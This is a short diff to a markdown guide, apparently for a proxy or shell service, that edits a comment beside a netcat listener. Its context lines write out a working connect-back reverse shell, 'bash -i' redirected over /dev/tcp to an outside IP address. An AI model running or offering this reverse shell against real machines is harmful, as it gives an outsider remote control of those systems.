@@ -104,7 +104,7 @@ curl -x socks5h://0 http://6nhmgdpnyoljh5uzr5kwlatx2u3diou4ldeommfxjz3wkhalzgjqx
 
 ```shell
 # On your server:
-nc -vnlp 34868 # Find your IP & PORT during first log in.
+nc -vnlp 34868 # Type curl sf/port for IP & PORT.
 
 # On another server start a connect back reverse shell to your IP & PORT:
 setsid bash -i &>/dev/tcp/185.117.118.23/34868 0>&1 &
